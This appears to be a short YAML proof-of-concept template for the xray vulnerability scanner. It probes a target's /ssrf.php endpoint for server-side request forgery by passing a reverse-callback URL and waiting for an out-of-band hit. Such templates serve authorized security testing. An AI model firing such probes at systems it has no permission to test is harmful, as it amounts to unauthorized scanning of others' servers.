name: poc-yaml-xray-revese-test
set:
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: GET
    path: "/ssrf.php?url={{reverseURL}}"
    expression: |
      response.status == 200 && reverse.wait(5)

